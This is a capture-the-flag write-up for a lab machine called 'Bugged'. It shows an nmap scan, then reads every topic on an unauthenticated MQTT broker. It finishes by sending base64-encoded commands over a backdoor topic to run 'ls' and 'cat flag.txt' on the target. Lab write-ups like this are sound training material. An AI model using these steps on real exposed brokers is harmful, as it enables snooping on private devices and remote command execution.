# Bugged

### Bugged
Initial nmap scan finds ports 22 and 1883 open:

    PORT     STATE SERVICE                  VERSION
    22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 ef:1b:d6:2e:db:7c:35:64:de:98:31:42:38:e8:db:42 (RSA)
    |   256 8d:72:32:f3:46:a7:9d:c9:34:11:00:04:28:59:29:c9 (ECDSA)
    |_  256 f7:de:a6:67:2d:d5:68:0f:16:6f:82:19:26:af:df:a4 (ED25519)
    1883/tcp open  mosquitto version 2.0.14
    | mqtt-subscribe: 
    |   Topics and their most recent payloads: 
    |     $SYS/broker/load/publish/sent/1min: 24.67
    |     $SYS/broker/clients/active: 2
    |     $SYS/broker/load/sockets/5min: 0.45
    |     livingroom/speaker: {"id":4758133639208311874,"gain":44}
    |     $SYS/broker/load/bytes/received/1min: 4349.71
    |     $SYS/broker/publish/messages/sent: 55
    |     $SYS/broker/load/messages/received/1min: 93.57
    |     $SYS/broker/load/bytes/sent/5min: 509.01
    |     $SYS/broker/load/bytes/received/15min: 1511.62
    |     $SYS/broker/load/publish/sent/15min: 1.79
    |     $SYS/broker/load/messages/sent/1min: 118.24
    |     $SYS/broker/store/messages/count: 32
    |     $SYS/broker/load/bytes/sent/1min: 1508.18
    |     $SYS/broker/clients/connected: 2
    |     $SYS/broker/load/connections/15min: 0.18
    |     $SYS/broker/load/connections/5min: 0.45
    |     $SYS/broker/messages/stored: 32
    |     $SYS/broker/publish/bytes/sent: 494
    |     $SYS/broker/load/sockets/1min: 1.83
    |     $SYS/broker/load/sockets/15min: 0.18
    |     storage/thermostat: {"id":11919371477083620108,"temperature":23.998812}
    |     patio/lights: {"id":11390279783440024999,"color":"BLUE","status":"OFF"}
    |     $SYS/broker/store/messages/bytes: 171
    |     $SYS/broker/load/publish/sent/5min: 5.30
    |     $SYS/broker/bytes/received: 27917
    |     kitchen/toaster: {"id":16176590697967907648,"in_use":true,"temperature":154.42686,"toast_time":167}
    |     frontdeck/camera: {"id":16684758411119567518,"yaxis":46.723053,"xaxis":25.03653,"zoom":3.3390436,"movement":false}
    |     $SYS/broker/messages/sent: 643
    |     $SYS/broker/load/messages/received/5min: 66.31
    |     $SYS/broker/load/bytes/received/5min: 3132.11
    |     $SYS/broker/uptime: 385 seconds
    |     $SYS/broker/retained messages/count: 36
    |     $SYS/broker/load/messages/sent/5min: 71.62
    |     $SYS/broker/load/messages/sent/15min: 33.71
    |     $SYS/broker/subscriptions/count: 3
    |     $SYS/broker/load/bytes/sent/15min: 209.97
    |     $SYS/broker/clients/total: 2
    |     $SYS/broker/bytes/sent: 4840
    |     $SYS/broker/publish/bytes/received: 19872
    |     $SYS/broker/load/messages/received/15min: 31.93
    |     $SYS/broker/load/connections/1min: 1.83
    |     $SYS/broker/version: mosquitto version 2.0.14
    |     $SYS/broker/messages/received: 589
    |_    $SYS/broker/clients/maximum: 2
SSH version doesn't have any critical vulnerability. So I look online for "mosquitto version 2.0.14". <br />
MQTT (Message Queuing Telemetry Transport) is a lightweight communication protocol used in very low band networks, such an IoT network. It uses a publish/subscribe model, meaning that messages always pass through a 
centralized broker. So there are three different roles:

- Broker → the central server that receives every message and forwards them to the interested clients.
- Publisher → the device that sends messages about a "topic".    
- Subscriber → the device that subscribes to a topic, so that the broker will forward to it all the messages about that topic.
<br />
A topic is like a channel, e.g. `home/linvingroom/temperature`. <br />
So with this enumeration, my understading is that the target machine is the centralized broker, running mosquitto version 2.0.14. Port 1883 is standard for unencrypted MQTT, while port 8883 is standard for crypted MQTT.<br />
This means that in this case I can potentially read every message sent by the broker (i.e. the target machine). To connect to the mosquitto server, I need a mosquitto client. So I install it with `sudo apt install mosquitto-clients`.<br />
I then run a command to subscribe to all topics, so that I can read all messages which is ` mosquitto_sub -h target_IP -p 1883 -t "#" ` :<br />
<img width="1881" height="672" alt="image" src="https://github.com/user-attachments/assets/6b8470ee-58ac-417a-aa60-cb5730b45269" /><br />
I receive information about the physical status of what looks to be a toast? Idk whatever. What's interesting is that I find the following base64 encoded string:

      {
        "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
        "registered_commands": ["HELP","CMD","SYS"],
        "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
        "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
      }
It seems like I might be able to interact with this system using these two channels! Let's try to send a HELP command with `mosquitto_pub -h 10.10.133.181 -p 1883 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m '{"HELP"}'`:<br />
<img width="1918" height="353" alt="image" src="https://github.com/user-attachments/assets/9a5806d5-833b-4dae-b5f0-065b4c929357" /><br />
I get another base64 encoded string, which decodes to: 

    Invalid message format.
    Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
Okay so now I know which format to use to send commands to the target machine. So I create the following command `{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls"}`, base64 encode it and send it to the broker, the full command is `mosquitto_pub -h 10.10.133.181 -p 1883 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImxzIn0='`.<br />
And I receive the following response: <br />
<img width="966" height="559" alt="Screenshot 2025-08-28 121614" src="https://github.com/user-attachments/assets/0d243fdd-b159-44fe-8b44-93594fbbf724" />
<br />
There's the flag in there. To see it, instead of sending the command `ls`, just send the command `cat flag.txt`, decode the response and get the flag :)<br />
<img width="940" height="172" alt="image" src="https://github.com/user-attachments/assets/44deac2a-26b9-4103-b1b9-1e77c91e73d8" />
<br />

